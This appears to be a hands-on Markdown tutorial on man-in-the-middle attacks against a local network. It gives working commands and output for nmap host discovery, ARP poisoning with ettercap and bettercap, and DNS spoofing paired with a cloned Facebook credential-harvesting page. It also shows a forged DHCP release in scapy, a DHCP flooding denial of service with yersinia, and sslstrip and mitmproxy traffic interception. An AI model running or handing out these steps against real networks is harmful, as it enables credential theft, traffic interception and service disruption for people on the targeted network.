---
typora-root-url: ./
---

# Man in the middle

Most of man of the middle attacks has been countered by the apparition of HTTPS and HSTS. Further reading here : [https://medium.com/@munteanu210/ssl-certificates-vs-man-in-the-middle-attacks-3fb7846fa5db](https://medium.com/@munteanu210/ssl-certificates-vs-man-in-the-middle-attacks-3fb7846fa5db)

Some attack are still made by getting into registrar or social engineering.

In case of a wired network, we should use a Hub to connect on network, or use a DOS on the switch to put it in degraded mode (Broadcast data on all ports) or on wifi. 

## Host scan

Find host on network: 
	
	nmap -sn 192.168.1.0/24
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 15:01 CET
	Nmap scan report for box (192.168.1.1)
	Host is up (0.018s latency).
	MAC Address: E4:5D:51:CA:6B:18 (SFR)
	Nmap scan report for MBP-de-Florent (192.168.1.38)
	Host is up (0.13s latency).
	MAC Address: F4:0F:24:1A:3F:84 (Apple)
	Nmap scan report for HPA58000 (192.168.1.40)
	Host is up (0.26s latency).
	MAC Address: 30:E1:71:A5:80:00 (Hewlett Packard)
	Nmap scan report for SoundTouch-20 (192.168.1.56)
	Host is up (0.25s latency).
	MAC Address: 88:4A:EA:7E:FA:49 (Texas Instruments)
	Nmap scan report for 192.168.1.78
	Host is up (0.23s latency).
	MAC Address: B0:C0:90:DA:2C:52 (Chicony Electronics)
	Nmap scan report for FNN-LAPTOP (192.168.1.90)
	Host is up (0.054s latency).
	MAC Address: E4:70:B8:D7:48:DF (Intel Corporate)
	Nmap scan report for kali (192.168.1.25)
	Host is up.
	Nmap done: 256 IP addresses (7 hosts up) scanned in 3.65 seconds

## ARP Poisoning

ARP is level 2 communication protocol and is used for device communications on the same network. In this attack we will behave as the default gateway for external request and change routeur MAC address in target arp tables for our interface MAC Address.

### Ettercap

Activate ip_forward

```
sysctl -w net.ipv4.ip_forward=1
```

Launch ettercap (not from root)

```
ettercap -G
```

Define Target from menu Target > Select Target:


    HOST1 = Cible
    HOST2 = Routeur (ie:192.168.1.1)

Launch arppoisoning by clicking Start/Stop ARP Poisoning and Follow connections. 

### Bettercap 

Best way to install bettercap on linux is to install go https://tecadmin.net/install-go-on-debian/

Then follow below instructions from https://www.bettercap.org/installation/ 

```
sudo apt update
sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
go get -u github.com/bettercap/bettercap
```

In order to launch web UI i had to copy the following directory:

```
sudo cp -r /usr/local/share/bettercap/ui /usr/share/bettercap/
```

Once installed, launch bettercap:

```
bettercap
bettercap v2.27.1 (built for linux amd64 with go1.14.1) [type 'help' for a list of commands]
192.168.1.0/24 > 192.168.1.26  »  
```

`help` to see the different options and module loaded in the bettercap interpreter:

```
 	  any.proxy > not running
       api.rest > not running
      arp.spoof > not running
      ble.recon > not running
        caplets > not running
    dhcp6.spoof > not running
      dns.spoof > not running
  events.stream > running
            gps > not running
            hid > not running
     http.proxy > not running
    http.server > not running
    https.proxy > not running
   https.server > not running
    mac.changer > not running
    mdns.server > not running
   mysql.server > not running
      net.probe > not running
      net.recon > not running
      net.sniff > not running
   packet.proxy > not running
       syn.scan > not running
      tcp.proxy > not running
         ticker > not running
             ui > not running
         update > not running
           wifi > not running
            wol > not running

```

For arp poisoning, we need to specify target ip address. To show all endpoints:

```
net.sniff on
net.show
```

A table with all IP address discovered is displayed. 

![image-20200424151622294](/images/mitm/image-20200424151622294.png)

See the different parameters for arp spoofing:

```
192.168.1.0/24 > 192.168.1.26  » help arp.spoof

arp.spoof (not running): Keep spoofing selected hosts on the network.

   arp.spoof on : Start ARP spoofer.
     arp.ban on : Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.
  arp.spoof off : Stop ARP spoofer.
    arp.ban off : Stop ARP spoofer.

  Parameters

  arp.spoof.fullduplex : If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail). (default=false)
    arp.spoof.internal : If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network. (default=false)
     arp.spoof.targets : Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges. (default=<entire subnet>)
   arp.spoof.whitelist : Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing. (default=)

```

We define the target (192.168.1.68) and start spoofing:

```
set arp.spoof.targets 192.168.1.68
arp.spoof on
```

### Verify Poisoning with Wireshark

Suppose we infected 192.168.1.68 then open wireshark and add filter:

```
ip.addr == 192.168.1.68
```

On the target device open url http://tapriuneclak.com something will show up as below:

![](/images/mitm/wireshark_mitm.png)



## DNS Poisoning

In this attack we will be responding with our IP Address for domain resolution.

```
set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.1.26 
dns.spoof on
```

`192.168.1.26` is our computer IP Address. All request to `facebook.com` will be redirected to `192.168.1.26`.

We haven't configured any server listening on port 443 so when the target computer type [https://facebook.com](https://facebook.com) the browser reply the website is inaccessible.

We will Social Engineering Toolkit to generate a fake Facebook website.

```
setoolkit
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
IP address for the POST back in Harvester/Tabnabbing [192.168.1.26]: (Let default value which is your computer IP Address)
Enter the url to clone: htps://facebook.com
```

We now have a new socket listening on port 80 with facebook website clone:

```
root@kali:~# netstat -ltn
Connexions Internet actives (seulement serveurs)
Proto Recv-Q Send-Q Adresse locale          Adresse distante        Etat       
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN  
```

![image-20200424180426765](/images/mitm/image-20200424180426765.png)

Start HTTPS proxy from bettercap:

```
https.proxy.
```



## DHCP Spoofing

This attack is based on a faster answer to DHCPRequest than DHCP server from targeted network. If the server is answering before us a DOS on it could resolve the problem.

More informations here: [https://www.whitewinterwolf.com/posts/2017/10/30/dhcp-exploitation-guide/](https://www.whitewinterwolf.com/posts/2017/10/30/dhcp-exploitation-guide/)

### Force DHCP Release

Force DHCP Release with scapy:

- Client : 192.168.1.97 08:C5:E1:89:31:BC
- Server (routeur): 192.168.1.1 E4:5D:51:CA:6B:18

```
sendp(Ether(src="08:C5:E1:89:31:BC",dst="E4:5D:51:CA:6B:18") /
IP(src="192.168.1.97",dst="192.168.1.1") /
UDP(sport=68,dport=67) /
BOOTP(chaddr="\x08\xC5\xE1\x89\x31\xBC",ciaddr="192.168.1.97",xid=random.randint(0, 0xFFFFFFFF)) /
DHCP(options=[("message-type","release"),("server_id", "192.168.1.1"),"end"]), iface="wlan0") 
```

### DOS (Denial of Service)

Once IP Adresse was released, we have to make sure we will answer before the router:

Flood DHCP server to make sure, it will note answer:

```
yersinia dhcp -interface wlan0 -attack 1	
```

Parameters available:

```
Dynamic Host Configuration Protocol (DHCP):
     -source hw_addr
            Source MAC address
     -dest hw_addr
            Destination MAC address
     -interface iface
            Set network interface to use
     -attack attack
            Attack to launch

Attacks Implemented in DHCP:
0: NONDOS attack sending RAW packet
1: DOS attack sending DISCOVER packet
2: NONDOS attack creating DHCP rogue server
3: DOS attack sending RELEASE packet
```



## Exploitation

### HSTS - HTTP to HTTPS exploit with sslstrip

There's some website which still have HTTP enabled and not redirected directly to HTTPS. This flaw allow our computer to act like a proxy and redirect HTTP request to HTTPS ([https://jlajara.gitlab.io/posts/2019/11/11/HSTS.html](https://jlajara.gitlab.io/posts/2019/11/11/HSTS.html) for more informations).

We will use Bettercap to exploit this after doing the ARP Poisoning steps.

```
set http.proxy.sslstrip true
http.proxy on
```

Show active module with `active` command:

```
arp.spoof (Keep spoofing selected hosts on the network.)

  arp.spoof.targets : 192.168.1.68
  arp.spoof.whitelist : 
  arp.spoof.internal : false
  arp.spoof.fullduplex : false

http.proxy (A full featured HTTP proxy that can be used to inject malicious contents into webpages, all HTTP traffic will be redirected to it.)

  http.port : 80
  http.proxy.port : 8080
  http.proxy.redirect : true
  http.proxy.script : 
  http.proxy.sslstrip : true
  http.proxy.address : <interface address>
  http.proxy.injectjs : 
  http.proxy.blacklist : 
  http.proxy.whitelist : 

...

```

Les redirections de ports sont créé automatiquement dans iptables:

```
flow@kali:~/Documents/mkdoc$ sudo iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
DNAT       tcp  --  anywhere             anywhere             tcp dpt:http to:192.168.1.26:8080
DNAT       tcp  --  anywhere             anywhere             tcp dpt:https to:192.168.1.26:8083
```

It's possible to see all data on the WebUI with the following command:

```
http-ui
```

And open a brower to `http://127.0.0.1`

![image-20200424160552505](/images/mitm/image-20200424160552505.png)

!!! warning
    This flaw is not working with HTTPS. HSTS is often activated on most common website (Facebook, instragram, ...) and prevent to access the webpage in HTTP.

Some other bettercap usages ([https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets))

## Annex

### Mitmproxy (sslsplit equivalent)

This solution will not be discret unless you setup the mitm.it ssl certificate on target device. 
Once certificate is installed the target device connection will appear as secure.

Activate ip forward

```
sysctl -w net.ipv4.ip_forward=1
```

Launch mitmproxy

```
mitmproxy -m transparent -k
```

Mitm proxy use port 8080 to receive request. Though, you should redirect 443 and 80.

```
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

Navigate to mitm.it with the target device





